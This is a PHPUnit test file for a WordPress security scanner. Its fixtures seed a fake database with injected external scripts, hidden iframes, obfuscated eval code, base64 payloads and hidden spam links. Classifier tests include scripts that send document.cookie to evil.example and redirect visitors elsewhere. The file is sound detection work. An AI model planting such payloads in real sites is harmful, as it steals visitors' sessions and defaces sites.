<?php

// SPDX-FileCopyrightText: 2026 GoBuildWP <dev@gobuildwp.com>
// SPDX-License-Identifier: GPL-2.0-or-later

declare(strict_types=1);

namespace GoBuildWP\Tests\Unit\Kits\SecurityIntegrity;

require_once __DIR__ . '/harness.php';

use GoBuildWP\Kits\SecurityIntegrity as SI;
use GoBuildWP\Kits\SecurityIntegrity\TestNet;
use PHPUnit\Framework\TestCase;

/**
 * The database scan against a scripted $wpdb: accounts, roles, URLs, settings, options, posts,
 * widgets and scheduled events. Results name rows by login, option name or id only.
 */
final class DatabaseTest extends TestCase
{
    private mixed $previousWpdb = null;

    private FakeWpdb $db;

    private Fixture $site;

    protected function setUp(): void
    {
        reset_state();
        $this->site = new Fixture();
        $this->previousWpdb = $GLOBALS['wpdb'] ?? null;
        $this->db = new FakeWpdb();
        $GLOBALS['wpdb'] = $this->db;
    }

    protected function tearDown(): void
    {
        $GLOBALS['wpdb'] = $this->previousWpdb;
        $this->site->remove();
        reset_state();
    }

    private static function ago(int $days): string
    {
        return gmdate('Y-m-d H:i:s', time() - $days * DAY_IN_SECONDS);
    }

    private function seed(): void
    {
        update_option('wp_user_roles', [
            'administrator' => ['name' => 'Administrator', 'capabilities' => ['manage_options' => true, 'read' => true]],
            'editor' => ['name' => 'Editor', 'capabilities' => ['edit_others_posts' => true, 'read' => true]],
            'subscriber' => ['name' => 'Subscriber', 'capabilities' => ['read' => true, 'level_0' => true, 'edit_users' => true]],
            'seo_boss' => ['name' => 'SEO', 'capabilities' => ['manage_options' => true]],
            // A plugin's own capabilities on a low role (here a two-factor screen) are not an elevation.
            'customer' => ['name' => 'Customer', 'capabilities' => ['read' => true, 'wfls_show_login_security' => true, 'wf2fa_activate_2fa_self' => true]],
        ]);
        $this->db->admin(1, 'admin', self::ago(400));
        $this->db->admin(2, 'k3x9q7m2z8p4', self::ago(5), session: false);
        $this->db->admin(4, 'owner@example.com', self::ago(400));
        $this->db->userRows[3] = ['login' => 'jane', 'registered' => self::ago(400)];
        $this->db->meta[] = [3, 'wp_capabilities', serialize(['editor' => true])];
        $this->db->meta[] = [1, '_application_passwords', serialize([['uuid' => 'u1', 'password' => '$generic$hashvalue', 'name' => 'phone']])];

        $this->db->option('home', 'https://example.test');
        $this->db->option('siteurl', 'http://other.example');
        $this->db->option('evil_opt', '<script>' . 'ev' . 'al(1)</script>');
        $this->db->option('my_api_key', '<script>x</script>');
        $this->db->option('gobuildwp_kit_si_jobs', 'base64_decode');
        $this->db->option('big_autoload', str_repeat('x', 1_100_000), 'on');
        $this->db->option('widget_text', serialize([2 => ['text' => '<script>' . 'ev' . 'al(at' . 'ob("YQ=="))</script>']]));

        $this->db->postRows[10] = ['content' => '<p>Hi</p><script src="https://cdn.bad.example/x.js"></script>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[11] = ['content' => '<iframe width="0" height="0" src="https://bad.example"></iframe>', 'status' => 'draft', 'type' => 'page'];
        $this->db->postRows[12] = ['content' => '<script src="https://example.test/a.js"></script>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[13] = ['content' => '<iframe width="0" src="x"></iframe>', 'status' => 'inherit', 'type' => 'revision'];

        update_option('home', 'https://example.test');
        update_option('users_can_register', 1);
        update_option('default_role', 'editor');
        update_option('active_plugins', ['gone/gone.php', 'here/here.php']);
        $this->site->put('wp-content/plugins/here/here.php', '<?php');
    }

    /** @return array{items: list<array<string, mixed>>, state: array<string, mixed>} */
    private static function scan(string $mode): array
    {
        $state = [];
        SI\db_init(['mode' => $mode], $state);
        $out = new SI\Collector($state);
        self::assertTrue(SI\db_run(['mode' => $mode], $state, new SI\Budget(SI\budgets(), 30), $out));
        return ['items' => $out->items, 'state' => $state];
    }

    /** @param list<array<string, mixed>> $items */
    private static function lines(array $items): array
    {
        $lines = [];
        foreach ($items as $item) {
            if (!str_starts_with((string) $item['rule_id'], 'config.')) {
                $lines[] = $item['rule_id'] . ' ' . $item['entity']['label'];
            }
        }
        sort($lines);
        return $lines;
    }

    public function test_full_scan_reports_each_area_by_name_only(): void
    {
        $this->seed();
        $scan = self::scan('full');
        self::assertSame([
            'app_passwords.privileged_user admin',
            'options.active_plugin_missing active_plugins',
            'options.autoload_large autoloaded options',
            'options.eval evil_opt',
            'options.script_tag evil_opt',
            'posts.external_script 10',
            'posts.hidden_iframe 11',
            'roles.low_role_elevated subscriber',
            'roles.unknown_admin_role seo_boss',
            'settings.open_registration_role editor',
            'urls.host_mismatch siteurl',
            'urls.mixed_scheme siteurl',
            'users.admin_no_session k3x9q7m2z8p4',
            'users.common_admin_login admin',
            'users.new_admin k3x9q7m2z8p4',
            'users.privileged_count privileged users',
            'users.random_login k3x9q7m2z8p4',
            'widgets.obfuscated_js widget_text',
        ], self::lines($scan['items']));

        $by_rule = array_column($scan['items'], null, 'rule_id');
        self::assertSame(3, $by_rule['users.privileged_count']['detail']->count);
        foreach ($scan['items'] as $item) {
            self::assertNotSame('', $item['entity']['id'], $item['rule_id'] . ' names an entity (Cloud rejects an empty id)');
            self::assertMatchesRegularExpression('/^[A-Za-z0-9_]{1,64}$/', $item['entity']['table'], $item['rule_id']);
        }
        self::assertSame(1, $by_rule['app_passwords.privileged_user']['detail']->count);
        self::assertSame('high', $by_rule['roles.low_role_elevated']['severity_hint'], 'edit_users on subscribers is dangerous');
        self::assertSame('high', $by_rule['settings.open_registration_role']['severity_hint']);
        self::assertSame(1, $by_rule['options.active_plugin_missing']['detail']->count);
        self::assertSame('posts', $by_rule['widgets.obfuscated_js']['area']);

        $json = (string) json_encode($scan['items']);
        self::assertStringNotContainsString('owner@example.com', $json, 'an email login is shown as its user id');
        self::assertStringNotContainsString('hashvalue', $json);
        self::assertStringNotContainsString('<script', $json);
        self::assertStringNotContainsString('my_api_key', $json, 'secret-looking options are not looked at');

        foreach (SI\DB_AREAS as $area) {
            self::assertSame('checked', $scan['state']['coverage'][$area]['state'], $area);
        }
        self::assertGreaterThan(0, $scan['state']['rows_checked']);
    }

    /** Content with link spam, comments and post meta: the rows the full scan reads past posts. */
    private function seed_content(): void
    {
        $this->db->option('home', 'https://example.test');
        update_option('home', 'https://example.test');
        $script = '<script src="https://evil.example/t.js"></script>';
        $blob = str_repeat('QUJD', 600);
        $this->db->postRows[20] = ['content' => '<p>ok</p>', 'title' => $script, 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[21] = ['content' => '<p>ok</p>', 'excerpt' => '<div style="display:none"><a href="https://pills.example/">cheap</a></div>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[22] = ['content' => '<p>Visit <a href="https://spam.example/">best casino bonus</a></p>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[23] = ['content' => '<p><a href="https://www.example.test/casino-night">our casino night</a></p>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[24] = ['content' => '<p>' . $blob . '</p>', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[25] = ['content' => '<img src="data:image/png;base64,' . $blob . '">', 'status' => 'publish', 'type' => 'post'];
        $this->db->postRows[26] = ['content' => '<div style="position:absolute; left:-9999px"><a href="https://x.example/">a</a></div>', 'status' => 'draft', 'type' => 'page'];
        $this->db->postRows[27] = ['content' => '<img style="display:none" src="x.png"><a href="https://x.example/">buy</a>', 'status' => 'publish', 'type' => 'post'];

        $this->db->commentRows[1] = ['content' => 'Nice! <a href="https://spam.example/">cheap viagra</a>', 'approved' => '1'];
        $this->db->commentRows[2] = ['content' => 'Nice! <a href="https://spam.example/">cheap viagra</a>', 'approved' => '0'];
        $this->db->commentRows[3] = ['content' => 'Hi ' . $script, 'approved' => '0'];
        $this->db->commentRows[4] = ['content' => 'Hi ' . $script, 'approved' => 'spam'];
        $this->db->commentRows[5] = ['content' => 'Hi ' . $script, 'approved' => 'trash'];

        $this->db->postmetaRows[1] = ['post' => 20, 'key' => 'custom_html', 'value' => $script];
        $this->db->postmetaRows[2] = ['post' => 20, 'key' => '_oembed_abc', 'value' => $script];
        $this->db->postmetaRows[3] = ['post' => 21, 'key' => 'payload', 'value' => 'base' . '64_decode("eA==")'];
        $this->db->postmetaRows[4] = ['post' => 21, 'key' => '_elementor_css', 'value' => $script];
        $this->db->postmetaRows[5] = ['post' => 21, 'key' => 'stripe_secret_key', 'value' => $script];

        $this->db->option('footer_links', '<span style="font-size:0"><a href="https://loans.example/">x</a></span>');
        $this->db->option('blogroll', '<a href="https://viagra.example/">pills</a>');
        $this->db->option('partners', '<a href="https://partner.example/">Our partner</a> <div style="display:none">note</div>');
    }

    /** @param list<array<string, mixed>> $items */
    private static function content_lines(array $items): array
    {
        return array_values(array_filter(
            self::lines($items),
            static fn(string $line): bool => preg_match('/^(?:posts|comments|postmeta)\.|^options\.(?:hidden|spam)_link/', $line) === 1,
        ));
    }

    public function test_full_scan_reads_titles_comments_post_meta_and_link_spam(): void
    {
        $this->seed_content();
        $scan = self::scan('full');
        self::assertSame([
            'comments.external_script 3',
            'comments.spam_link 1',
            'options.hidden_link footer_links',
            'options.spam_link blogroll',
            'postmeta.base64_decode post 21 payload',
            'postmeta.external_script post 20 custom_html',
            'posts.base64_blob 24',
            'posts.external_script 20',
            'posts.hidden_link 21',
            'posts.hidden_link 26',
            'posts.spam_link 22',
        ], self::content_lines($scan['items']));

        $by_rule = [];
        foreach ($scan['items'] as $item) {
            $by_rule[$item['rule_id']] = $item;
        }
        self::assertSame('high', $by_rule['posts.hidden_link']['severity_hint']);
        self::assertSame('medium', $by_rule['posts.spam_link']['severity_hint']);
        self::assertSame('medium', $by_rule['posts.base64_blob']['severity_hint']);
        self::assertSame('high', $by_rule['options.hidden_link']['severity_hint']);
        self::assertSame(['table' => 'wp_comments', 'id' => '1', 'label' => '1'], $by_rule['comments.spam_link']['entity']);
        self::assertSame('posts', $by_rule['comments.spam_link']['area'], 'reported in an area Cloud already accepts');
        self::assertSame('wp_postmeta', $by_rule['postmeta.base64_decode']['entity']['table']);
        self::assertSame('posts', $by_rule['postmeta.base64_decode']['area']);
        self::assertSame('checked', $scan['state']['coverage']['posts']['state']);
        $json = (string) json_encode($scan['items']);
        self::assertStringNotContainsString('viagra', $json, 'content never leaves the site');
        self::assertStringNotContainsString('stripe_secret_key', $json, 'secret-looking meta keys are not looked at');
        foreach ($this->db->queries as $query) {
            self::assertStringNotContainsString("IN ('1', '0', 'spam'", $query);
        }
    }

    public function test_comment_and_post_meta_windows_resume_from_the_last_row_read(): void
    {
        $this->seed_content();
        $whole = self::content_lines(self::scan('full')['items']);
        add_filter('gobuildwp_kit_security_integrity_budgets', static fn(array $b): array => ['rows' => 1] + $b);
        self::assertSame(1, SI\budgets()['rows']);
        self::assertSame($whole, self::content_lines(self::scan('full')['items']));
    }

    public function test_a_spam_run_held_for_moderation_is_reported_once_with_counts_only(): void
    {
        $this->seed_content();
        $held = static fn(array $items): array => array_values(array_filter($items, static fn(array $i): bool => $i['rule_id'] === 'comments.held_spam'));
        for ($id = 100; $id < 100 + SI\HELD_LINKED_MIN - 3; $id++) {
            $this->db->commentRows[$id] = ['content' => 'Great post', 'url' => 'https://pinco-casino.example.shop/', 'approved' => '0'];
        }
        $this->db->commentRows[200] = ['content' => 'old https://x.example/', 'approved' => '0', 'days' => 30];
        $this->db->commentRows[201] = ['content' => 'thanks, no link', 'approved' => '0'];
        $this->db->commentRows[202] = ['content' => 'see www.x.example', 'approved' => 'spam'];
        self::assertSame([], $held(self::scan('full')['items']), 'one short: comments 2 and 3 plus 22 recent, linked ones');

        $this->db->commentRows[300] = ['content' => 'visit https://x.example/', 'approved' => '0'];
        $items = $held(self::scan('full')['items']);
        self::assertCount(1, $items);
        self::assertSame('low', $items[0]['severity_hint']);
        self::assertSame('posts', $items[0]['area']);
        self::assertSame(['table' => 'wp_comments', 'id' => 'held', 'label' => 'comments waiting for moderation'], $items[0]['entity']);
        $detail = (array) $items[0]['detail'];
        self::assertSame(SI\HELD_LINKED_MIN, $detail['count']);
        self::assertStringContainsString('(27 waiting in all)', $detail['reason']);
        self::assertStringNotContainsString('pinco', (string) json_encode($items), 'no comment content leaves the site');
    }

    public function test_link_classifier_needs_a_hidden_or_spam_link_to_another_site(): void
    {
        $host = 'example.test';
        $hidden = static fn(string $style): array => SI\classify_links('<p>x</p><div style="' . $style . '"><p><a href="https://other.example/">a</a></p></div>', $host);
        self::assertSame([['hidden_link', 'high']], $hidden('display: none'));
        self::assertSame([['hidden_link', 'high']], $hidden('visibility:hidden'));
        self::assertSame([['hidden_link', 'high']], $hidden('font-size:0px;'));
        self::assertSame([['hidden_link', 'high']], $hidden('height:0;overflow:hidden'));
        self::assertSame([['hidden_link', 'high']], $hidden('overflow: hidden; height: 0px'));
        self::assertSame([['hidden_link', 'high']], $hidden('top:-5000px;position:absolute'));
        self::assertSame([], $hidden('position:absolute;left:-10px'), 'a small offset is layout, not hiding');
        self::assertSame([], $hidden('font-size:0.9em'));
        self::assertSame([], $hidden('line-height:0;overflow:hidden'));
        self::assertSame([['hidden_link', 'high']], SI\classify_links('<a style="display:none" href="https://other.example/">a</a>', $host));
        self::assertSame([], SI\classify_links('<div style="display:none"><a href="https://sub.example.test/">a</a></div>', $host), 'the site\'s own subdomain');
        self::assertSame([], SI\classify_links('<div style="display:none"><a href="/about">a</a></div>', $host));
        self::assertSame([], SI\classify_links('<div style="display:none">menu</div><a href="https://other.example/">a</a>', $host), 'the link is after the hidden element');
        self::assertSame([], SI\classify_links('<div style="display:none"><a href="https://other.example/">a</a>', $host), 'no closing tag: not judged');
        self::assertSame([['spam_link', 'medium']], SI\classify_links('<a href="https://other.example/p?x=payday-loans">rates</a>', $host));
        self::assertSame([], SI\classify_links('<a href="https://other.example/">Casinoroyale review</a>', $host), 'whole words only');
        self::assertSame([['spam_link', 'medium']], SI\classify_links('<a href="https://pinco-official.example.shop/">Pinco aviator</a>', $host));
        self::assertSame([['spam_link', 'medium']], SI\classify_links('<a href="https://x.example/">online betting bonus</a>', $host));
        self::assertSame([], SI\classify_links('<a href="https://example.test/porn-filter">porn filter</a>', $host), 'own-site links are not spam');
        self::assertSame([], SI\classify_content('<script>var a = "<a href=\'https://x.example\'>casino</a>";</script>', $host, links: false));
    }

    public function test_an_open_registration_into_a_privileged_role_is_critical(): void
    {
        $this->seed();
        update_option('default_role', 'seo_boss');
        $items = array_column(self::scan('light')['items'], null, 'rule_id');
        self::assertSame('critical', $items['settings.open_registration_role']['severity_hint']);
    }

    public function test_light_scan_skips_content_areas(): void
    {
        $this->seed();
        $scan = self::scan('light');
        foreach (['options', 'posts', 'cron'] as $area) {
            self::assertSame('skipped', $scan['state']['coverage'][$area]['state'], $area);
        }
        $rules = array_column($scan['items'], 'rule_id');
        self::assertContains('users.new_admin', $rules);
        self::assertNotContains('options.eval', $rules);
        foreach ($this->db->queries as $query) {
            self::assertStringNotContainsString('post_content', $query);
        }
    }

    public function test_missing_roles_make_the_roles_area_unavailable(): void
    {
        $scan = self::scan('light');
        self::assertSame('unavailable', $scan['state']['coverage']['roles']['state']);
    }

    public function test_cron_events_without_a_handler_or_pointing_elsewhere(): void
    {
        TestNet::$actions = ['wp_version_check', 'odd_fetch'];
        $state = [];
        SI\db_init(['mode' => 'full'], $state);
        $out = new SI\Collector($state);
        SI\area_cron($out, $state, [
            1_700_000_000 => [
                'wp_version_check' => ['k1' => ['schedule' => 'twicedaily', 'args' => []]],
                'orphan_hook' => ['k2' => ['args' => []], 'k3' => ['args' => [1]]],
                'odd_fetch' => ['k4' => ['args' => ['https://bad.example/payload']]],
                'own_fetch' => ['k5' => ['args' => ['https://www.example.test/ok']]],
            ],
            'version' => 2,
        ]);
        $lines = array_map(static fn(array $i): string => $i['rule_id'] . ' ' . $i['entity']['label'], $out->items);
        sort($lines);
        self::assertSame(['cron.no_callback orphan_hook', 'cron.no_callback own_fetch', 'cron.remote_url_args odd_fetch'], $lines);
    }

    public function test_content_classification(): void
    {
        $rules = static fn(string $html): array => array_column(SI\classify_content($html, 'example.test'), 0);
        self::assertSame(['external_script'], $rules('<script src="//cdn.other.example/a.js"></script>'));
        self::assertSame([], $rules('<script src="https://cdn.example.test/a.js"></script>'), 'own subdomain');
        self::assertSame(['hidden_iframe'], $rules('<iframe style="display:none" src="x"></iframe>'));
        self::assertSame([], $rules('<iframe width="560" height="315" src="https://video.example/embed"></iframe>'));
        self::assertSame(['obfuscated_js'], $rules('<script>' . 'ev' . 'al(String.fromCharCode(97))</script>'));
        self::assertSame(['eval'], $rules('<script>var a = 1; ' . 'ev' . 'al(a)</script>'));
        self::assertSame(['cookie_exfil', 'redirect'], $rules('<script>document.location="https://evil.example/?c="+document.cookie</script>'));
        self::assertSame(['redirect'], $rules('<p>Hi</p><script>window.location.href = "https://spam.example/go";</script>'));
        self::assertSame(['redirect'], $rules('<script>location.replace("//spam.example/x")</script>'));
        self::assertSame([], $rules('<script>if (location.hash === "#a") { location.href = "/shop"; }</script>'), 'same-site path');
        self::assertSame([], $rules('<script>if (location.search == "?x") var u = "https://other.example/";</script>'), 'reads location only');
        self::assertSame(['cookie_exfil'], $rules('<script>new Image().src="//x.example/c?"+document.cookie</script>'));
        self::assertSame([], $rules('<script>if (document.cookie.indexOf("ok") === -1) location.href = "https://www.example.test/consent";</script>'), 'own host');
        self::assertSame([], $rules('<script>var c = document.cookie;</script>'), 'no other host');
    }

    public function test_secret_option_names_are_never_read(): void
    {
        foreach (['my_api_key', 'smtp_password', 'stripe_secret', 'auth_salt', 'license_key', 'admin_email'] as $name) {
            self::assertTrue(SI\skipped_option($name), $name);
        }
        foreach (['blogname', 'evil_opt', 'sidebars'] as $name) {
            self::assertFalse(SI\skipped_option($name), $name);
        }
        self::assertTrue(SI\skipped_option('widget_text'), 'widgets are read by the posts area');
    }

    public function test_php_end_of_life_and_config_file_permissions(): void
    {
        $now = (int) strtotime('2026-10-28 12:00:00 UTC');
        self::assertSame('config.php_eol', SI\php_eol_rule('8.0.30', $now)[0]);
        self::assertSame('config.php_eol', SI\php_eol_rule('7.2.1', $now)[0]);
        self::assertSame('config.php_eol_soon', SI\php_eol_rule('8.2.10', $now)[0]);
        self::assertNull(SI\php_eol_rule('8.3.16', $now));
        self::assertNull(SI\php_eol_rule('9.0.0', $now));

        self::assertSame([['config.wp_config_world_writable', 'high']], SI\config_permission_results('x', 0100666));
        self::assertSame([['config.wp_config_world_readable', 'low']], SI\config_permission_results('x', 0100644));
        self::assertSame([], SI\config_permission_results('x', 0100640));

        update_option('home', 'https://example.test');
        $rules = array_column(SI\config_results('8.0.1', $now), 'rule_id');
        self::assertContains('config.php_eol', $rules);
        foreach (SI\config_results('8.0.1', $now) as $item) {
            self::assertSame('config', $item['area']);
            self::assertMatchesRegularExpression('/^[A-Za-z_.\-]+$/', $item['entity']['label']);
        }
    }

    public function test_generated_looking_logins(): void
    {
        self::assertTrue(SI\random_login('k3x9q7m2z8p4'));
        self::assertTrue(SI\random_login('a1b2c3d4e5f60789'));
        self::assertFalse(SI\random_login('johnsmith'));
        self::assertFalse(SI\random_login('jane1984'));
        self::assertSame('user #7', SI\login_label('someone@example.com', 7));
        self::assertSame('editor', SI\login_label('editor', 7));
    }
}
